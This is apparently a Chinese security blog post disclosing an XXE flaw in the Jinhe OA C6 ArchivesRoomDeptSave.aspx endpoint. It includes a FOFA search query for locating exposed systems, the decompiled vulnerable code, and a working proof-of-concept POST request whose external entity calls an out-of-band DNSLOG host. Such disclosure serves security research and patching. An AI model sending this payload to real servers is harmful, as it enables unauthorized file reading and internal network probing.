---
title: "金和OA ArchivesRoomDeptSave.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ArchivesRoomDeptSave-xxe.html
asset_dir: assets/金和oa-archivesroomdeptsave.aspx-xxe漏洞
---

# 金和OA ArchivesRoomDeptSave.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/11/13 13:32
* 1933浏览
* [0评论](#comment)
* 10分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ArchivesRoomDeptSave.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ArchivesRoomDeptSave.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Archives.dll` 将其进行反编译后找到 **ArchivesRoomDeptSave** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
  if (this.IsPostBack)
    return;
  XmlDataDocument xmlDataDocument = new XmlDataDocument();
  ((XmlDocument) xmlDataDocument).Load(this.Request.InputStream);
```

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.Archives/ArchivesRoomDeptSave.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

[![金和OA ArchivesRoomDeptSave.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.XXE](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA ArchivesRoomDeptSave.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-ArchivesRoomDeptSave-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-ArchivesRoomDeptSave-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全运维咨询

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ArchivesRoomDeptSave-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALaElEQVR4AeyZC5bjuA5Dc2f/e57XMA5kSpacT32SN+06wwEJgpQiWpWk+p/b7fbvq/bv8PNsn5SnLvEMR03iGc7qV9ysfuQeqY1mrH021kD+1Fz/fcoJtIH8mfDtURs3D9yArj6as57RrBDcFzhIZn0jArb9QI/JVxz7zHKVkw/uW2vFV6u5e36tawOp5OW/7wQOAwFPH4642maegFkejn2g58Z6cD68ML3BOTiidLJoH0Ho+8xqwJpZ7h4HroUjzmoPA5mJLu73TuDHBqIntVpe0owDPz2jJrEwdfJliSuKr5Zc5VZ+tBVX2vDgfQOhvow/NpAv7+wvbfCtAwGmn26Al44XaP3GBrDnoPdHbWLodUBS03WAjc+tAcet6Aecbx3ID+zvr2v5MwP5647x+17wYSC5njNcLQu+yrUm2srJB2uh/yI55qDPg+tWfVUfiya44pMXRgNeBxDdWTQz7IQlmGnDFVlzDwNpmct5ywm0gQDbGxjcx1d2Cu6bp0MI5sZ+ysnAedhvy6iFXTPmEoM16hlLLjGsNdGCNWMMhGoIvHSebSCt0+W89QT+yRPyCo47h/2pSA7MpX944cglBtdIE4Mjp1xqhIpnppys5hTLwH3ly6pm9JWXjXyNlf+KXTeknuYH+HcHAn6CYI15Is5eD6zrV3XpKxw1cL8fWDPWKoZ5DswDkm0GTN8PtuTwP+i1Q7oLwdpK3h1IFV/+z5/AP+ApgfGRJfXEVnuk5hlNes9qznLRjxq4/9rAmtQKx37iZOHPUDrZmWaW+3+6IbP9/+e4ayAfNtLDx95H9ge+3tBjrdV1lVVOvrjRwH2Ul0EfixstPSo/comD4L6wf9FMLghHDZira8lPjRB6DfSx9HDkxFe7bkg9jQ/wl2/qcJymnoRqj+y/6uWD+wLLculkVaBYVjn54mLA9vFUfDUwH50QzEUHfSwezEkvgz6WJqZ8tfAVk6+cfHBf4HbdkNtn/Tw1ENgnCfvv4bykPAFCsDY56OPwQull8mVgLdxH6WPqIYO+TpwsOqFiGVgrTiYuplgGvUbcaGANGMf8LM46FZ8ayKzpxX3vCbSBZErQTzi8MEvLlyU+Q+j7PaJVb1nVKq5Wc6Mf3cjXGB7fV+rSF1wLOyY3ahPPEFxfc20glbz8953ANZD3nf105fbFEHx9xqs3qwJrwRgNOAZCNUzfikkC3cdVcFy1YC41QTAPRzzT1N7yZ1rx1aIJl1gIXl9+NTAPO9b86F83ZDyRN8d3BwL7ZPNkBLP3xDOMBvY+YD+5WZ245CuCa5VfWdVXv+rBfWpe/kwDvRYcV61qq4E1lYu+cvLBWuD6Ynj7sJ/2p5PVvjJVIeyThOMXw9oDrFVdtaqJD9ZCj8kLaw/54r5i6iFLD/myxBXFyyo3+spXS75y4Nc3y0V391dWii/8nRNoA8mEzpaNJhgtePKw40qTGiFYL1821ohbGbgWjriqmfHg+uTAMey/AcBcNEEwD4TaPi3CHrfExAE2fU21gVTy8t93AsuB5GkFTxFouwS2yYIx2opN/IQDfb9aCs5VTv7ZmslJ96ilRgjna571VL1spoF5X2mXA1HyspdP4OXCayAvH93PFLY/naQ9rK9TNLqKssTgGlhjtKq7Z+A+qakI61z6Rg/WjnzyMwTXAIc0sPxVHXHWAmvDC5MbEawFri+Gtw/7aV8MwVPK9MBx3S+YA2PNyU9tRfHVwLVAo4HuyUsCdj7ciLBrwH402UfiitBrwXFqhFVffeVk4Bo4YvSw58KNqF6x6z1kPJ03x08NJFMc8ew1jNoap65y8sNXFC8LJ39l0YwI+9M61kYLR01yqQFrwguTG1G5GLgOekxe+NRAVHDZz57ASwMBT3jcGpgHxtSXY2B7nxkbgXlgTG16OPISAltevmx8shWLf9ag7/ts/UsDeXaRS//4CVwDefysfkXZBqIrKsuq8mWJK4qXVU6+uBj46sIaVSODXpMeyt2zaIUrLbj/Kn+PV2/ZPZ3y0snkjyZ+ZuD9AdcXw9uH/bQ/nYCndLY/sAZ6PKuZPRHhwH1SH36MwwuTA9fCEaMJqm5l0TyC4LXSq9aAc9DjTBMOrE0/YfuVFdGF7z2B9qeTbAM8tcQVNcFqyYUD18L+r23RBOGoSX00Qdi14UZMrTA5+bLEQdj7gf3kgmAeCLV9PIZ1LKHWk8mXyR9NfLXkK3fdkHoaH+C3gcymtdofsD01Yz49hGAN9KhcDJxLH3AMxuiE0ciXJa4oXgaur7nRl0428jWGeR/VjQbWhgfHsOMqV9dsA6nk5b/vBNqnrNUWMlVhNPKrwf4UgP2al5/aiuJllas+uBdQ6c4HttsKO6pnNXCucmkCzoFxpqmc/FntyEknC19RfLWau25IPY0P8N8wkA941R+8hcPH3lwl8BWGHfM6wFziGcJcA+aBVgZsv3ZCZA+JZzjTzDjVhgevAzsmF5R+NNj1QEunpmKSQPeawleEo+a6IfWEPsBvA4HjtLS/2fTDKS8b4xUnvhp4zbEeel751IFzYFQuBuZW2vDC1MiXgWthx1Ezxqq7Z6kRwt4bmJa2gUyzF/nrJ9AGognKgO13n3xZ3RE4Bz1WTXzoNeolS16oWCZfJr+auBi4X+IgmIf9zzVgLppg7Q3WgDG5aB9BcC3sOPaBY27U1LXaQCp5+e87gfbFEDzJTA8cw47JBV/ZdmqF9+phX3ulVZ9YNPfi6CqC10qtEMxV3T0fXKN6WdWDc+GUl4F54PoHqtuH/Vy/sj5tIODroqsjA8fZp7hYOOg14SuONcmBa4FQ24cIoGFLFCf9gkmB64BQrc8j2miCrUlxkgO23iXV3GgaMXFGDRz7XTdkcnDvpNqbejaxmiJ4mrB/vEwNOJdYCD0HjtNfKJ1MfjWwVrkYmANj+IrQ56CP6xrxodeAYzi+ztTUNeOD68Y4NUKwBozRKhe7bkhO5UNwOZBMrO4zHPQTjib5iskFwbVAqAPW+q/4Y2Ngew8AWir9gS3XEsWBPgeOUyuMXL4s8QyVl81yy4HMxBf38yfQBgKeOvQ424KmK0tOvixxRfGycPJj0K8FjqOtCM5Bj2earBNNYmG4EZWLgddaacB52N9vwFx61NoZpzy4Bri+GN4+7Kf9A1WmFzzbJ3ii0YJj2HGsn2mjSS5xEPZ+j2hSF4S9Hnp/1Kz6R3cPwf2jA8dwxGhm2H5lzZIX9/sncA3k9Mx/P3n4Ypgt5ApXHHOJgzMt+MpGUzF6sCZxNImF4YLiVjZqxlh14DWTm6F0sllu5KSb2ahTDP3ate66ITqhD7L2pg6eGjyOz7wOcN+zGrAGjFULR055MA8o7AxYftmLME8nWAtHjCY1Zwiun2nSZ8SqvW5IPY0P8NtAxqmdxat9g58O2HGlFQ/WyZdlTfkycB5QOLXUCKeCQgLbjYHjF7kiO7iw18HuH4R/CO1D9sd9+D/Ye7aBPFx9CX/0BA4DgX1a0PvP7ERPSbXUzrjkRqza+NFAvzfY42jGmsRCsF7+ytInOOrCC8H9oEflYuBc4mDtexhIRBe+5wSugbzn3JerfstAcuXqKuDrCcaZZuRgrYV5Lj0qZh/Q14BjOL6pg3OpPUOwdrZm6moufnLg+sQVv2UgteHlf+0EvnUgeRKEq22Bnw6gSaSvBmwfT5vgj5P8H3f5H/R1ZzXQa9MUzAOhbmOfMW7CiQNsrwVo2bP6bx1IW/FyXj6Bw0AyvRk+s8pYD2xPylkP6DXgGDiUpT+w9QUOGmDLJZGaisnNMDpwH1hjtMFZv0e4w0AeKbo0P3cCbSCwnj70udV2YNetNHmChI9opJNFC14jsXKxkUsMroEdk0ttMLwQrJcvi2aGyleDvla51MmvBtYC17+p3z7sp92QD9vXX7ud/wEAAP//VyhctAAAAAZJRE